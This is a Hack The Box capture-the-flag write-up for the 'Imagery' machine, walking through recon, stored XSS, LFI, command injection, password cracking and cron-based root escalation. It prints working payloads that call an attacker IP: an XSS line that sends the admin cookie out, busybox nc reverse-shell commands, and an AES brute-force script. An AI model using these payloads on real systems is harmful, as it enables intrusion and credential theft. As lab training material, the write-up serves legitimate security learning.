---
title: 'HTB-Imagery'
published: 2025-09-18
draft: false
toc: true
---
**Start 08:35 28-09-2025**

---
```
Scope:
10.10.11.88
```
# Recon
## Nmap

```bash
sudo nmap -sV -sC -sT -p- imagery.htb -T5 --min-rate=5000 -vvvv -Pn

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    syn-ack Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
9001/tcp open  http    syn-ack SimpleHTTPServer 0.6 (Python 3.12.7)
|_http-title: Directory listing for /
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/3.12.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We notice 2 `python` webservers running as well as a `ssh` port.

I quickly check out both to see the difference:

![](attachments/9e15df915df9a0bed8447fb73367d551.png)

![](attachments/1e0c7b3cfc164f0744c43b8f4ffaab52.png)

I download the `.zip` and head on over to the `8000` port.

![](attachments/d40414f1fe3c03e2bac408ae8c8e4179.png)

I couldn't access the `.zip` yet since it's encrypted with an `AES` encryption which meant we'd need the password first.

## 8000/TCP - HTTP

I can register for an account here:

![](attachments/ceabc43350823cf86bdc02f646b9a7e0.png)

Here I filled in the following creds for testing:

```
tester@test.com
Tester123!
```

![](attachments/20d7802120e48da9cef00f250e5e0666.png)

In response I get the following `GET` request:

![](attachments/19eaacf38bc318e4726cc5853abfa4a0.png)

I noticed the `isAdmin:false` thus tried to manipulate it with an intercept:

![](attachments/c27208b836277ec74b93fd3a0dbfd175.png)

However this just pops an error:

![](attachments/f2f8765d7b0826a92d456bb6b5b68861.png)

I went ahead and signed in to the account and once logged in was greeted with this dashboard:

![](attachments/06b921ab256d2246c0f4020a0aad2047.png)

At first glance this looks like a **file upload attack**.

We can upload images and down at the bottom I notice the **Uploading as Account ID:** 

![](attachments/f6e2403a13ffb3c7c2f67e44925a8c99.png)

On upload I could view the image:

![](attachments/19b70f74a0a0eba84b85f1f073f82a67.png)

I could then either **Download** or **Delete** it.

![](attachments/b83420b3cb5c6ac6bdfc8e3f0fc540f7.png)

Here arises the problem, the website isn't running on `php` so uploading a `php webshell` will be pointless. I started testing for other vulnerabilities.

### API source code

By checking the source code I discovered that apparently the first user to be registered will be an Admin user:

![](attachments/b15ba101bf21cd3568c5991378d8fa72.png)

Scrolling further down I find the following in the JS script:

![](attachments/ae484bdab34479888d2b2f49d747edc0.png)

![](attachments/14e73f734759863256f6e600f82d5070.png)

It looks like there's a bug reporting functionality, as well as an admin panel.

![](attachments/bf9290ead5051c1dbdd1aa8e7fde99b7.png)

I checked out the API:

![](attachments/1d20c21d2babada7e0251fe114d3bb02.png)

It appears that we are not the first user to be registered then. I scrolled to the bottom of the home page and found the quick link to the bug reporting functionality:

![](attachments/0683cc6a827bc73d73a7749164705735.png)

# Exploitation
## Stored XSS

![](attachments/d91b6e401515c84232271bbfa1aad242.png)

I tested out the functionality of the form:

![](attachments/13f5913c02f838b43311aa10cab94578.png)

I went on to test some **XSS** payloads:

![](attachments/736c15b9ebdaacb212ae1e54ad4e7609.png)

This didn't give me any callback though. I checked out the source code again:

```js
 data.bug_reports.forEach(report => {
	const reportCard = document.createElement('div');
	reportCard.className = 'bg-white p-6 rounded-xl shadow-md border-l-4 border-purple-500 flex justify-between items-center';
	
	reportCard.innerHTML = `
		<div>
			<p class="text-sm text-gray-500 mb-2">Report ID: ${DOMPurify.sanitize(report.id)}</p>
			<p class="text-sm text-gray-500 mb-2">
				Submitted by: ${DOMPurify.sanitize(report.reporter)} 
				(ID: ${DOMPurify.sanitize(report.reporterDisplayId)}) on ${new Date(report.timestamp).toLocaleString()}
			</p>
			<h3 class="text-xl font-semibold text-gray-800 mb-3">Bug Name: ${DOMPurify.sanitize(report.name)}</h3>
			<h3 class="text-xl font-semibold text-gray-800 mb-3">Bug Details:</h3>
			<div class="bg-gray-100 p-4 rounded-lg overflow-auto max-h-48 text-gray-700 break-words">
				${report.details}
			</div>
		</div>
		<button onclick="showDeleteBugReportConfirmation('${DOMPurify.sanitize(report.id)}')" 
		class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg shadow-md transition duration-200 ml-4">
			Delete
		</button>
	`;
	bugReportsList.appendChild(reportCard);
});
```

We can exploit it and catch the admin cookie:

```bash
<img src=x onerror=\"fetch('http://10.10.14.42/c=' + document.cookie)\">
```

![](attachments/5f53471ee23119c21e5404ee3eafeff6.png)

![](attachments/c5d34ce907fc1db8ac29f9bc67e83566.png)

I inserted this cookie and was now able to access the Admin Panel:

![](attachments/efd1c6b2c8bc002cab5f79e1d31efc29.png)

Inside the admin panel we notice all the previously found API endpoints:

![](attachments/16f0b6c63c8bd64981e7cf72bb393dc5.png)

I downloaded one of the logs and noticed something right away:

![](attachments/ece72a87ee935c7256e0af25b98245f2.png)

We get a `log_identifier` parameter, it looks like it fetches local files. We can logically test for **LFI** now.

## LFI

![](attachments/db00115c29544ba20e8cd73220004014.png)

It worked right away, awesome. Right away I noticed 2 users:

```
web
mark
```

I tried fetching their `id_rsa` but this didn't work.

Using [this cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/List_Of_File_To_Include.txt) I then found a useful endpoint:

![](attachments/1a21eb84de5f8dbf06d279a3fb372e2b.png)

Looking further in the `/proc` directory I found the `/proc/self/cwd/config.py` endpoint which referenced the `db.json` database which contained data for the website:

![](attachments/3346a6ebbbe9fc9200e9d7bbc4c98ef3.png)

![](attachments/919aad6f7890b3a0f0dc30b901a08a14.png)

The hash for *testuser* is easily cracked:

![](attachments/e2dbc9682961280cf5bc5da68cf4fe20.png)

```
iambatman
```

Unfortunately I could not password spray as the `ssh` port did *not* allow password auth:

![](attachments/8d5ba52acbfb932148c9017c28f18aac.png)

I thus decided to login to the web page using the *testuser* creds instead:

![](attachments/c858bfabba984167fa6bccfb4af8b349.png)

I tried out uploading an image again and this time around there's more functionalities:

![](attachments/02b87432b3b910224343b6f72a95854f.png)

I could for example transform the image, e.g. crop it:

![](attachments/e4da61f2412eb84755819f219b400cb8.png)

By applying the transformation I saw the following request:

![](attachments/dccddf9018ff7270430db4b5e55dae64.png)

## Command Injection

I tried out to inject arbitrary commands:

![](attachments/d1e8f0f00d72f5d69a78e282c2c0f9ec.png)

![](attachments/949157468742bbfdeb355578c5998a4d.png)

This showed me that it tried to execute the command but failed. This is because it wants to append another command/file afterwards as shown by the `+0`.

Thus I tried out appending a `#`:

![](attachments/91b0a7c96c612bda9b73537d2564756f.png)

![](attachments/7f6747972037a212b6bc68d6c3442170.png)

Even though it did not show any response it did not fail this time.

# Foothold
## Shell as web

I could finally form the following command in order to achieve a reverse shell:

```bash
"x":"8;bash -c 'busybox nc 10.10.14.42 80 -e bash' #",
```

![](attachments/7eeb623ada04fa92352fbf21bfd7f465.png)

![](attachments/5914589b2dd89862fe082af220e6064f.png)

However I was not able to get the `user.txt` flag yet. For this I had to move laterally to *mark*.

## Enumeration

I transferred over some tools to enumerate the system:

![](attachments/cd8b08cbcf0357f358461deeb0ececb4.png)

### linpeas

![](attachments/24f19d86448f26afcb1b39c40e7b1980.png)

Some of the findings included:

![](attachments/f96a4a032e1d783c1e731e2e95d8f5c4.png)

![](attachments/02f45a53e03cece69af807bda6d336cd.png)

![](attachments/b741ca63ff4065a282963e8dece8d6b4.png)

I then found an interesting `cron` job which showed up as a PE vector:

![](attachments/34a685a4fcde2ae40c973687dabe69cd.png)

Inside the file we find a set of creds:

![](attachments/de994fecead5db30266bf5cc2e692657.png)

```
admin@imagery.htb
strongsandofbeach
```

However other than that there was nothing inside this file. The creds couldn't be sprayed either against the other users:

![](attachments/074741b970e974033b7689a8d2c82be5.png)

Instead I went ahead and checked out the other cron job, which uses `tar` to make a backup of the `/home` directory.

![](attachments/d98b8553fd059d093a701b6a1ed4ed1d.png)

I downloaded over the `zip` file:

![](attachments/eedeb7df29e0d5358e6961cd20122be5.png)

Using `strings` I analyzed the file:

![](attachments/b33ad7912fe1e3c603c3683351b58b9b.png)

Apparently it's encrypted using `pyAesCrypt 6.1.1` 

![](attachments/648622853eda2c4c0a9a0f78159b5449.png)

We can install the package as follows:

![](attachments/c0bfb190758d028b7a7726c04e7b6b1b.png)

![](attachments/9940bc54923650548ed4a50231590b79.png)

I then used the following script to brute force the password:

```python
#!/usr/bin/env python3
import pyAesCrypt
import traceback

GREEN = "\033[92m"
RESET = "\033[0m"

buffer_size = 64 * 1024

encrypted_file = "web_20250806_120723.zip.aes"
output_file = "decrypted.zip"
wordlist = "/usr/share/wordlists/rockyou.txt"

def try_password(pwd):
    try:
        pyAesCrypt.decryptFile(encrypted_file, output_file, pwd.strip(), buffer_size)
        return True
    except Exception:
        return False

with open(wordlist, "r", encoding="latin-1") as wl:
    for password in wl:
        password = password.strip()
        try:
            if try_password(password):
                print(f"{GREEN}[+] Password found: {password}{RESET}")
                print("[âœ“] Decryption finished, check out output file.")
                break
        except KeyboardInterrupt:
            print("\n[!] Interrupted.")
            break
        except Exception:
            # silent fail for noisy errors
            pass
    else:
        print("[-] Password not found.")
```

![](attachments/bc4cb51626986f590defa8b87d7fee57.png)

The output is absolutely massive:

![](attachments/335b4ceb14f6b974bfea83898c08921d.png)

This was a complete backup of the `/web` directory. Luckily for us it also contained the original version of the `db.json` file, containing multiple credential sets:

![](attachments/9c802c5df3a4ba7fe5afbf1968e019d9.png)

![](attachments/4f47fcf148271fa6700bcdffc5c88968.png)

The password is easily cracked

```
supersmash
```

## Lateral Movement to mark

Using the password I move laterally:

![](attachments/023541ffa2d18ec8ecb7b8d58e816038.png)

![](attachments/8c101113227adf03c1871d24e23ce121.png)

A non-default binary is found, I'll focus on it after fetching the `user.txt` flag.

### user.txt

![](attachments/2357992bfad9395aaaed9d9a6800a8ad.png)

# Privilege Escalation
## charcol

I check out the binary

![](attachments/a9a48d91fd75e64c69f8157f8c105033.png)

Since I didn't know the password I used the `-R` flag:

![](attachments/0c9040ed9d7cfbde2b19db0dc7f45000.png)

I could then start it up in interactive mode:

![](attachments/4271cbf124dfc3822d6f0f058537f0a2.png)

After using the `help` command I skim the manual, noticing the cron jobs tab:

![](attachments/6c6a5466ed85e1ff3bf23603092d83fb.png)

I will abuse this to add the following cron job which will give me a *root* shell.

```bash
auto add --schedule "* * * * *" --command "bash -c 'busybox nc 10.10.14.42 443 -e bash'" --name "hack"
```

![](attachments/3d151ff55bc2894a6e1d46c9c4580fa1.png)

After waiting for a short while:

![](attachments/ca9a5ef302f961bb1a93b3d766cd4c95.png)

### root.txt

![](attachments/f9d16e0634d9dafe82834d44af083e17.png)

![](attachments/8491d93af1e575a6a7baf2b5fa037b9e.png)

---

**Finished 18:00 20-11-2025**

[^Links]: [[Hack The Box]]

#XSS #LFI #command-injection #pyAesCrypt #SUID #cron 
